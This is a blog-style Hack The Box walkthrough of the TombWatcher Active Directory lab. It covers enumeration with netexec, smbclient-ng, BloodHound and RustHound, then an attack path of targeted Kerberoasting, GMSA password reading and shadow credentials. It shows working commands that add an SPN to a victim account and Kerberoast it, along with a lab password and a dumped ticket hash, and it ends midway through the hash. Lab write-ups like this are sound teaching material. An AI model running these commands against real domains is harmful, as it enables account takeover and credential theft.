---
title: "Hack The Box TombWatcher Machine|DACL & GMSA & TargetKerberoasting & ESC15"
description: "And here we go Maverick Back from the dark shadows, embracing the spotlight to write another Active Directory Hack The Box machine write-up. It contains some AD misconfigurations: a DACL issue, AD CS "
pubDate: 2025-10-19
tags: ["Security Research", "Red Team"]
author: "Mohamed Eletrepy (maverick)"
readingTime: 28
coverImage: "https://cdn-images-1.medium.com/max/800/0*C_WoRlH2QpMifoiM.gif"
---

---

### Hack The Box TombWatcher Machine|DACL & GMSA & TargetKerberoasting & ESC15

And here we go Maverick Back from the dark shadows, embracing the spotlight to write another Active Directory Hack The Box machine write-up. It contains some AD misconfigurations: a DACL issue, AD CS quirks, and the usual enumeration. Yup it’s a straightforward machine, so let’s get started.

![](https://cdn-images-1.medium.com/max/800/0*C_WoRlH2QpMifoiM.gif)

#### Nmap

```bash
# Nmap 7.95 scan initiated Sun Oct 12 18:08:45 2025 as: /usr/lib/nmap/nmap -sCV -Pn -oN nmap 10.10.11.72  
Nmap scan report for 10.10.11.72  
Host is up (0.092s latency).  
Not shown: 987 filtered tcp ports (no-response)  
PORT STATE SERVICE VERSION  
53/tcp open domain Simple DNS Plus  
80/tcp open http Microsoft IIS httpd 10.0  
|_http-title: IIS Windows Server  
|_http-server-header: Microsoft-IIS/10.0  
| http-methods:  
|_ Potentially risky methods: TRACE  
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-10-13 02:09:11Z)  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb  
| Not valid before: 2025-10-13T01:59:54  
|_Not valid after: 2026-10-13T01:59:54  
|_ssl-date: 2025-10-13T02:10:34+00:00; +4h00m09s from scanner time.  
445/tcp open microsoft-ds?  
464/tcp open kpasswd5?  
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)  
|_ssl-date: 2025-10-13T02:10:33+00:00; +4h00m10s from scanner time.  
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb  
| Not valid before: 2025-10-13T01:59:54  
|_Not valid after: 2026-10-13T01:59:54  
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)  
|_ssl-date: 2025-10-13T02:10:33+00:00; +4h00m10s from scanner time.  
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb  
| Not valid before: 2025-10-13T01:59:54  
|_Not valid after: 2026-10-13T01:59:54  
3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)  
|_ssl-date: 2025-10-13T02:10:33+00:00; +4h00m10s from scanner time.  
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb  
| Not valid before: 2025-10-13T01:59:54  
|_Not valid after: 2026-10-13T01:59:54  
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
|_clock-skew: mean: 4h00m09s, deviation: 0s, median: 4h00m09s  
| smb2-time:  
| date: 2025-10-13T02:09:56  
|_ start_date: N/A  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled and required  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done at Sun Oct 12 18:10:25 2025 -- 1 IP address (1 host up) scanned in 99.97 seconds
```

As usual, the domain controller is running its services SMB, LDAP, Kerberos, and more. We’re in an assume-breach scenario, which means there are lots of things we can enumerate from here: users, groups, SMB shares, AD CS, and of course we can do password-spraying and perform roasting attacks like Kerberoasting and AS-REP Roasting. I’ll generate the hosts file and then start the enumeration journey.

**📢Generete hosts file**

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# nxc smb 10.10.11.92 --generate-hosts-file hosts  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# cat hosts  
10.10.11.72 DC01.tombwatcher.htb tombwatcher.htb DC01  
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# cat hosts /etc/hosts | sponge /etc/hosts
```

---

#### 📢Initial Enumeration

![](https://cdn-images-1.medium.com/max/800/1*Ua_3En3P7vIC37tzcdKK7w.png)

*I added aCredLoggerproject to easily store credentials for any pentesting engagement. I can add ausernameandpassword, and if there’s ahashI can add that too everything stays organised.*

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# nxc smb 10.10.11.72 -u henry -p 'H3nry_987TGV!'  
SMB 10.10.11.72 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.72 445 DC01 [+] tombwatcher.htb\henry:H3nry_987TGV!  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# nxc ldap 10.10.11.72 -u henry -p 'H3nry_987TGV!'  
LDAP 10.10.11.72 389 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)  
LDAP 10.10.11.72 389 DC01 [+] tombwatcher.htb\henry:H3nry_987TGV!  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# nxc winrm 10.10.11.72 -u henry -p 'H3nry_987TGV!'  
WINRM 10.10.11.72 5985 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)  
WINRM 10.10.11.72 5985 DC01 [-] tombwatcher.htb\henry:H3nry_987TGV!
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# nxc smb 10.10.11.72 -u henry -p 'H3nry_987TGV!'  
SMB 10.10.11.72 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.72 445 DC01 [+] tombwatcher.htb\henry:H3nry_987TGV!  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# nxc smb 10.10.11.72 -u henry -p 'H3nry_987TGV!' --shares  
SMB 10.10.11.72 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.72 445 DC01 [+] tombwatcher.htb\henry:H3nry_987TGV!  
SMB 10.10.11.72 445 DC01 [*] Enumerated shares  
SMB 10.10.11.72 445 DC01 Share Permissions Remark  
SMB 10.10.11.72 445 DC01 ----- ----------- ------  
SMB 10.10.11.72 445 DC01 ADMIN$ Remote Admin  
SMB 10.10.11.72 445 DC01 C$ Default share  
SMB 10.10.11.72 445 DC01 IPC$ READ Remote IPC  
SMB 10.10.11.72 445 DC01 NETLOGON READ Logon server share  
SMB 10.10.11.72 445 DC01 SYSVOL READ Logon server share  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# nxc smb 10.10.11.72 -u henry -p 'H3nry_987TGV!' --users  
SMB 10.10.11.72 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.72 445 DC01 [+] tombwatcher.htb\henry:H3nry_987TGV!  
SMB 10.10.11.72 445 DC01 -Username- -Last PW Set- -BadPW- -Description-  
SMB 10.10.11.72 445 DC01 Administrator 2025-10-13 03:18:13 0 Built-in account for administering the computer/domain  
SMB 10.10.11.72 445 DC01 Guest <never> 0 Built-in account for guest access to the computer/domain  
SMB 10.10.11.72 445 DC01 krbtgt 2024-11-16 00:02:28 0 Key Distribution Center Service Account  
SMB 10.10.11.72 445 DC01 Henry 2025-05-12 15:17:03 0  
SMB 10.10.11.72 445 DC01 Alfred 2025-05-12 15:17:03 0  
SMB 10.10.11.72 445 DC01 sam 2025-10-13 02:51:51 0  
SMB 10.10.11.72 445 DC01 john 2025-10-13 02:55:28 0  
SMB 10.10.11.72 445 DC01 [*] Enumerated 7 local users: TOMBWATCHER  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# nxc smb 10.10.11.72 -u henry -p 'H3nry_987TGV!' --groups  
SMB 10.10.11.72 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.72 445 DC01 [+] tombwatcher.htb\henry:H3nry_987TGV!  
SMB 10.10.11.72 445 DC01 [-] [REMOVED] Arg moved to the ldap protocol  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# nxc ldap 10.10.11.72 -u henry -p 'H3nry_987TGV!' --groups  
LDAP 10.10.11.72 389 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)  
LDAP 10.10.11.72 389 DC01 [+] tombwatcher.htb\henry:H3nry_987TGV!  
LDAP 10.10.11.72 389 DC01 Administrators membercount: 3  
LDAP 10.10.11.72 389 DC01 Users membercount: 4  
LDAP 10.10.11.72 389 DC01 Guests membercount: 2  
LDAP 10.10.11.72 389 DC01 Print Operators membercount: 0  
LDAP 10.10.11.72 389 DC01 Backup Operators membercount: 0  
LDAP 10.10.11.72 389 DC01 Replicator membercount: 0  
LDAP 10.10.11.72 389 DC01 Remote Desktop Users membercount: 0  
LDAP 10.10.11.72 389 DC01 Network Configuration Operators membercount: 0  
LDAP 10.10.11.72 389 DC01 Performance Monitor Users membercount: 0  
LDAP 10.10.11.72 389 DC01 Performance Log Users membercount: 0  
LDAP 10.10.11.72 389 DC01 Distributed COM Users membercount: 0  
LDAP 10.10.11.72 389 DC01 IIS_IUSRS membercount: 0  
LDAP 10.10.11.72 389 DC01 Cryptographic Operators membercount: 0  
LDAP 10.10.11.72 389 DC01 Event Log Readers membercount: 0  
LDAP 10.10.11.72 389 DC01 Certificate Service DCOM Access membercount: 1  
LDAP 10.10.11.72 389 DC01 RDS Remote Access Servers membercount: 0  
LDAP 10.10.11.72 389 DC01 RDS Endpoint Servers membercount: 0  
LDAP 10.10.11.72 389 DC01 RDS Management Servers membercount: 0  
LDAP 10.10.11.72 389 DC01 Hyper-V Administrators membercount: 0  
LDAP 10.10.11.72 389 DC01 Access Control Assistance Operators membercount: 0  
LDAP 10.10.11.72 389 DC01 Remote Management Users membercount: 1  
LDAP 10.10.11.72 389 DC01 Storage Replica Administrators membercount: 0  
LDAP 10.10.11.72 389 DC01 Domain Computers membercount: 0  
LDAP 10.10.11.72 389 DC01 Domain Controllers membercount: 0  
LDAP 10.10.11.72 389 DC01 Schema Admins membercount: 1  
LDAP 10.10.11.72 389 DC01 Enterprise Admins membercount: 1  
LDAP 10.10.11.72 389 DC01 Cert Publishers membercount: 1  
LDAP 10.10.11.72 389 DC01 Domain Admins membercount: 1  
LDAP 10.10.11.72 389 DC01 Domain Users membercount: 0  
LDAP 10.10.11.72 389 DC01 Domain Guests membercount: 0  
LDAP 10.10.11.72 389 DC01 Group Policy Creator Owners membercount: 1  
LDAP 10.10.11.72 389 DC01 RAS and IAS Servers membercount: 0  
LDAP 10.10.11.72 389 DC01 Server Operators membercount: 0  
LDAP 10.10.11.72 389 DC01 Account Operators membercount: 0  
LDAP 10.10.11.72 389 DC01 Pre-Windows 2000 Compatible Access membercount: 2  
LDAP 10.10.11.72 389 DC01 Incoming Forest Trust Builders membercount: 0  
LDAP 10.10.11.72 389 DC01 Windows Authorization Access Group membercount: 1  
LDAP 10.10.11.72 389 DC01 Terminal Server License Servers membercount: 0  
LDAP 10.10.11.72 389 DC01 Allowed RODC Password Replication Group membercount: 0  
LDAP 10.10.11.72 389 DC01 Denied RODC Password Replication Group membercount: 8  
LDAP 10.10.11.72 389 DC01 Read-only Domain Controllers membercount: 0  
LDAP 10.10.11.72 389 DC01 Enterprise Read-only Domain Controllers membercount: 0  
LDAP 10.10.11.72 389 DC01 Cloneable Domain Controllers membercount: 0  
LDAP 10.10.11.72 389 DC01 Protected Users membercount: 0  
LDAP 10.10.11.72 389 DC01 Key Admins membercount: 0  
LDAP 10.10.11.72 389 DC01 Enterprise Key Admins membercount: 0  
LDAP 10.10.11.72 389 DC01 DnsAdmins membercount: 0  
LDAP 10.10.11.72 389 DC01 DnsUpdateProxy membercount: 0  
LDAP 10.10.11.72 389 DC01 Infrastructure membercount: 0  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# nxc smb 10.10.11.72 -u henry -p 'H3nry_987TGV!' --pass-pol  
SMB 10.10.11.72 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.72 445 DC01 [+] tombwatcher.htb\henry:H3nry_987TGV!  
SMB 10.10.11.72 445 DC01 [+] Dumping password info for domain: TOMBWATCHER  
SMB 10.10.11.72 445 DC01 Minimum password length: 1  
SMB 10.10.11.72 445 DC01 Password history length: 24  
SMB 10.10.11.72 445 DC01 Maximum password age: Not Set  
SMB 10.10.11.72 445 DC01  
SMB 10.10.11.72 445 DC01 Password Complexity Flags: 000000  
SMB 10.10.11.72 445 DC01 Domain Refuse Password Change: 0  
SMB 10.10.11.72 445 DC01 Domain Password Store Cleartext: 0  
SMB 10.10.11.72 445 DC01 Domain Password Lockout Admins: 0  
SMB 10.10.11.72 445 DC01 Domain Password No Clear Change: 0  
SMB 10.10.11.72 445 DC01 Domain Password No Anon Change: 0  
SMB 10.10.11.72 445 DC01 Domain Password Complex: 0  
SMB 10.10.11.72 445 DC01  
SMB 10.10.11.72 445 DC01 Minimum password age: None  
SMB 10.10.11.72 445 DC01 Reset Account Lockout Counter: 30 minutes  
SMB 10.10.11.72 445 DC01 Locked Account Duration: 30 minutes  
SMB 10.10.11.72 445 DC01 Account Lockout Threshold: None  
SMB 10.10.11.72 445 DC01 Forced Log off Time: Not Set
```

> With valid credentials I can enumerate users and users are critical in AD. We can perform password-spraying, inspect users and groups, and check many other things. To run an effective password-spraying attack you should first verify the domain’s password policy. I can do all of that with netexec .

And now it’s time for SMB enumeration.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# nxc smb 10.10.11.72 -u henry -p 'H3nry_987TGV!' -M spider_plus  
/root/.local/share/uv/tools/netexec/lib/python3.13/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.  
from pkg_resources import resource_filename  
SMB 10.10.11.72 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.72 445 DC01 [+] tombwatcher.htb\henry:H3nry_987TGV!  
SPIDER_PLUS 10.10.11.72 445 DC01 [*] Started module spidering_plus with the following options:  
SPIDER_PLUS 10.10.11.72 445 DC01 [*] DOWNLOAD_FLAG: False  
SPIDER_PLUS 10.10.11.72 445 DC01 [*] STATS_FLAG: True  
SPIDER_PLUS 10.10.11.72 445 DC01 [*] EXCLUDE_FILTER: ['print$', 'ipc$']  
SPIDER_PLUS 10.10.11.72 445 DC01 [*] EXCLUDE_EXTS: ['ico', 'lnk']  
SPIDER_PLUS 10.10.11.72 445 DC01 [*] MAX_FILE_SIZE: 50 KB  
SPIDER_PLUS 10.10.11.72 445 DC01 [*] OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus  
SMB 10.10.11.72 445 DC01 [*] Enumerated shares  
SMB 10.10.11.72 445 DC01 Share Permissions Remark  
SMB 10.10.11.72 445 DC01 ----- ----------- ------  
SMB 10.10.11.72 445 DC01 ADMIN$ Remote Admin  
SMB 10.10.11.72 445 DC01 C$ Default share  
SMB 10.10.11.72 445 DC01 IPC$ READ Remote IPC  
SMB 10.10.11.72 445 DC01 NETLOGON READ Logon server share  
SMB 10.10.11.72 445 DC01 SYSVOL READ Logon server share  
SPIDER_PLUS 10.10.11.72 445 DC01 [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/10.10.11.72.json".  
SPIDER_PLUS 10.10.11.72 445 DC01 [*] SMB Shares: 5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)  
SPIDER_PLUS 10.10.11.72 445 DC01 [*] SMB Readable Shares: 3 (IPC$, NETLOGON, SYSVOL)  
SPIDER_PLUS 10.10.11.72 445 DC01 [*] SMB Filtered Shares: 1  
SPIDER_PLUS 10.10.11.72 445 DC01 [*] Total folders found: 16  
SPIDER_PLUS 10.10.11.72 445 DC01 [*] Total files found: 4  
SPIDER_PLUS 10.10.11.72 445 DC01 [*] File size average: 1.48 KB  
SPIDER_PLUS 10.10.11.72 445 DC01 [*] File size min: 22 B  
SPIDER_PLUS 10.10.11.72 445 DC01 [*] File size max: 4.8 KB
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# smbclientng -d "tombwatcher.htb" -u "henry" -p 'H3nry_987TGV!' --host 10.10.11.72  
_ _ _ _  
___ _ __ ___ | |__ ___| (_) ___ _ __ | |_ _ __ __ _  
/ __| '_ ` _ \| '_ \ / __| | |/ _ \ '_ \| __|____| '_ \ / _` |  
\__ \ | | | | | |_) | (__| | | __/ | | | ||_____| | | | (_| |  
|___/_| |_| |_|_.__/ \___|_|_|\___|_| |_|\__| |_| |_|\__, |  
by @podalirius_ v3.0.0 |___/  
  
[+] Successfully authenticated to '10.10.11.72' as 'tombwatcher.htb\henry'!  
■[\\10.10.11.72\]> shares  
┏━━━━━━━━━━┳━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━┓  
┃ Share ┃ Visibility ┃ Type ┃ Description ┃  
┡━━━━━━━━━━╇━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━┩  
│ ADMIN$ │ Hidden │ DISKTREE, SPECIAL │ Remote Admin │  
│ C$ │ Hidden │ DISKTREE, SPECIAL │ Default share │  
│ IPC$ │ Hidden │ IPC, SPECIAL │ Remote IPC │  
│ NETLOGON │ Visible │ DISKTREE │ Logon server share │  
│ SYSVOL │ Visible │ DISKTREE │ Logon server share │  
└──────────┴────────────┴───────────────────┴─────────────────────┘  
■[\\10.10.11.72\]>
```

Hmm nothing interesting in the SMB shares, so it’s time to check roasting attacks.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# nxc ldap 10.10.11.72 -u henry -p 'H3nry_987TGV!' --asreproast -  
LDAP 10.10.11.72 389 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)  
LDAP 10.10.11.72 389 DC01 [+] tombwatcher.htb\henry:H3nry_987TGV!  
LDAP 10.10.11.72 389 DC01 No entries found!  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# nxc ldap 10.10.11.72 -u henry -p 'H3nry_987TGV!' --kerberoasting -  
LDAP 10.10.11.72 389 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)  
LDAP 10.10.11.72 389 DC01 [+] tombwatcher.htb\henry:H3nry_987TGV!  
LDAP 10.10.11.72 389 DC01 [*] Skipping disabled account: krbtgt  
LDAP 10.10.11.72 389 DC01 [*] Total of records returned 0
```

There were no AS-REP-roastable or Kerberoastable users, so it’s time to map the domain with BloodHound-CE.

With` bloodhound-ce-python`

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# bloodhound-ce-python -c all -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --zip -ns 10.10.11.72  
INFO: BloodHound.py for BloodHound Community Edition  
INFO: Found AD domain: tombwatcher.htb  
INFO: Getting TGT for user  
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)  
INFO: Connecting to LDAP server: dc01.tombwatcher.htb  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 1 computers  
INFO: Connecting to LDAP server: dc01.tombwatcher.htb  
INFO: Found 9 users  
INFO: Found 53 groups  
INFO: Found 2 gpos  
INFO: Found 2 ous  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer: DC01.tombwatcher.htb  
INFO: Done in 00M 15S  
INFO: Compressing output into 20251012201157_bloodhound.zip
```

I’m not a big fan of using **BloodHound-CE Python** because it doesn’t collect AD CS templates and that’s a really important part of any AD environment. So instead, I’ll run **RustHound-CE** to gather everything properly.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# rusthound-ce -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --zip -c All  
---------------------------------------------------  
Initializing RustHound-CE at 19:59:08 on 10/12/25  
Powered by @g0h4n_0  
Special thanks to NH-RED-TEAM  
---------------------------------------------------  
  
[2025-10-12T23:59:08Z INFO rusthound_ce] Verbosity level: Info  
[2025-10-12T23:59:08Z INFO rusthound_ce] Collection method: All  
[2025-10-12T23:59:11Z INFO rusthound_ce::ldap] Connected to TOMBWATCHER.HTB Active Directory!  
[2025-10-12T23:59:11Z INFO rusthound_ce::ldap] Starting data collection...  
[2025-10-12T23:59:12Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2025-10-12T23:59:17Z INFO rusthound_ce::ldap] All data collected for NamingContext DC=tombwatcher,DC=htb  
[2025-10-12T23:59:17Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2025-10-12T23:59:21Z INFO rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=tombwatcher,DC=htb  
[2025-10-12T23:59:21Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2025-10-12T23:59:23Z INFO rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=tombwatcher,DC=htb  
[2025-10-12T23:59:23Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2025-10-12T23:59:23Z INFO rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=tombwatcher,DC=htb  
[2025-10-12T23:59:23Z INFO rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2025-10-12T23:59:23Z INFO rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=tombwatcher,DC=htb  
[2025-10-12T23:59:23Z INFO rusthound_ce::json::parser] Starting the LDAP objects parsing...  
[2025-10-12T23:59:23Z INFO rusthound_ce::objects::domain] MachineAccountQuota: 10  
⠁ Parsing LDAP objects: 25% [2025-10-12T23:59:23Z INFO rusthound_ce::objects::enterpriseca] Found 11 enabled certificate templates  
[2025-10-12T23:59:23Z INFO rusthound_ce::json::parser] Parsing LDAP objects finished!  
[2025-10-12T23:59:23Z INFO rusthound_ce::json::checker] Starting checker to replace some values...  
[2025-10-12T23:59:23Z INFO rusthound_ce::json::checker] Checking and replacing some values finished!  
[2025-10-12T23:59:23Z INFO rusthound_ce::json::maker::common] 9 users parsed!  
[2025-10-12T23:59:23Z INFO rusthound_ce::json::maker::common] 61 groups parsed!  
[2025-10-12T23:59:23Z INFO rusthound_ce::json::maker::common] 1 computers parsed!  
[2025-10-12T23:59:23Z INFO rusthound_ce::json::maker::common] 2 ous parsed!  
[2025-10-12T23:59:23Z INFO rusthound_ce::json::maker::common] 3 domains parsed!  
[2025-10-12T23:59:23Z INFO rusthound_ce::json::maker::common] 2 gpos parsed!  
[2025-10-12T23:59:23Z INFO rusthound_ce::json::maker::common] 74 containers parsed!  
[2025-10-12T23:59:23Z INFO rusthound_ce::json::maker::common] 1 ntauthstores parsed!  
[2025-10-12T23:59:23Z INFO rusthound_ce::json::maker::common] 1 aiacas parsed!  
[2025-10-12T23:59:23Z INFO rusthound_ce::json::maker::common] 1 rootcas parsed!  
[2025-10-12T23:59:23Z INFO rusthound_ce::json::maker::common] 1 enterprisecas parsed!  
[2025-10-12T23:59:23Z INFO rusthound_ce::json::maker::common] 33 certtemplates parsed!  
[2025-10-12T23:59:23Z INFO rusthound_ce::json::maker::common] 3 issuancepolicies parsed!  
[2025-10-12T23:59:23Z INFO rusthound_ce::json::maker::common] .//20251012195923_tombwatcher-htb_rusthound-ce.zip created!  
  
RustHound-CE Enumeration Completed at 19:59:23 on 10/12/25! Happy Graphing!
```

When you start BloodHound-CE and mark **Henry** as the owned user, you’ll see outbound object relationships from Henry to other users following those connections will reveal the correct attack path.

![](https://cdn-images-1.medium.com/max/2560/1*-xSF3LgnWETeCMrj-RKcSg.png)

*Shortest Path From ownen Objects*

![](https://cdn-images-1.medium.com/max/1200/1*mFmlN9P7Kwajxv77AFaiWw.png)

*Attack Path from Henry To John*

**Attack path — polished**

As *Henry* we add an SPN to *Alfred* and Kerberoast that service to obtain Alfred’s credentials. With Alfred’s account compromised, we add ourselves to the **Infrastructure** group, which gives us **ReadGMSAPassword** on `ANSIBLE_DEV$`. Using that we obtain credentials that allow **ForceChangePassword** on `SAM`, letting us set a new password for the SAM account. Finally, with a **WriteOwner** DACL we create shadow credentials and take over `john`.

**Step-by-step (concise):**

1. Start as **Henry**.
2. Add an SPN targeting **Alfred** (make Alfred kerberoastable).
3. Kerberoast the SPN → recover Alfred’s credentials.
4. Compromise **Alfred**.
5. Add the compromised account to **Infrastructure**.
6. Read GMSA password for `ANSIBLE_DEV$`.
7. Use GMSA access to get **ForceChangePassword** on `SAM` and set a new password.
8. Leverage **WriteOwner** DACL to create shadow credentials.
9. Use those credentials to log in as **john**

![](https://cdn-images-1.medium.com/max/2560/1*sruYfxb9FHhMojhuWnfa6A.png)

*Attack Path*

![](https://cdn-images-1.medium.com/max/800/1*X-pwwBAXKaulaQqwuYUwSg.png)

*Henry →Alfred*

1. Add an SPN targeting **Alfred** (make Alfred kerberoastable).

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# bloodyAD -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --host DC01.tombwatcher.htb set object alfred servicePrincipalName -v 'http/pwnuser'  
[+] alfred's servicePrincipalName has been updated
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# sudo ntpdate 10.10.11.72 |netexec ldap dc01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' -k --kerberoasting output.txt  
LDAP dc01.tombwatcher.htb 389 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)  
LDAP dc01.tombwatcher.htb 389 DC01 [+] tombwatcher.htb\henry:H3nry_987TGV!  
LDAP dc01.tombwatcher.htb 389 DC01 [*] Skipping disabled account: krbtgt  
LDAP dc01.tombwatcher.htb 389 DC01 [*] Total of records returned 1  
LDAP dc01.tombwatcher.htb 389 DC01 [*] sAMAccountName: Alfred, memberOf: [], pwdLastSet: 2025-05-12 11:17:03.526670, lastLogon: <never>  
LDAP dc01.tombwatcher.htb 389 DC01 $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb\Alfred*$5db8dcfd4e51ffe9e0c5c05047135200$cf55519945b999c53096d1cee6da9b7429a8a6ef34c9e2e28558a5eb1e96c33c03baebe53e139d44bc345743825441016374bcfbd9eafb71e33fe423d1594833bdc1980585a4fe83c8e0c244bc3d31ded8eb7dc123425bc61bbb9b4c0284c5012eb376cb819344d2f557437bf28755fa0fbc2632a6d7c3d7eed35ba883417b1abe17acfa19a967bd24123f09b70ad45aba2d367184b08785a3d11b46a48009b3b92e748729cd697885fc6630fbea32e70a0eb8335eea9fc248a0a860d6ea86d548ea0bb79ca6fc1ebdf8350bdcb30090547a641b7201d7bb23ce607b96ce95ecc98591a9508ddb6f1240fab7cf9f08aeeb63914dcedc0b37a769ef9bc9ed8562c2f80597ce85a57eeb34faf6abfef614081fb8b8fdd69511417626d03ba9fed8c92aa5e0813f9f460f25cf24d395c04e1b2bc322a105ffaace3b741899e83b33a4ca7f73c20baa54dc486c117650664a6b96c2b1c6d243872489793a37a7774ac29a828507a64cf25c3b87a2229884af6c9462a639c1e1bbbe6b05e0df3180389db2aec796ea19071369e44fa737321754a92cadbead4145ce8997dd0bec89efd88cf36ebf440ead4b2a40c05b3b5db0e60653e01cdeefb738384c72df024bfe3c8a0467ae9b38736ae091d3f59fbe124376aee9ffa7798901fc19bfa989c1971c3864b7f0363041232fc692df326394e36a8a2648757f197c971ce2892ae3e6ae58ab68a1651adc6368cac09ac64d24fa7fb44199144159785020490d0ca40744c56569eb3d5a9978ab8eeee05bf59cc092cd13013aa3cce276ea8d55e84c65cfdc70785b8100f1fb7c2f44df60b6f6f9905282b70d15178fceb1deb6ad861ff908b9de352f992095353550dab1272f36e846440851a537d72d9b5bcaab4a8505b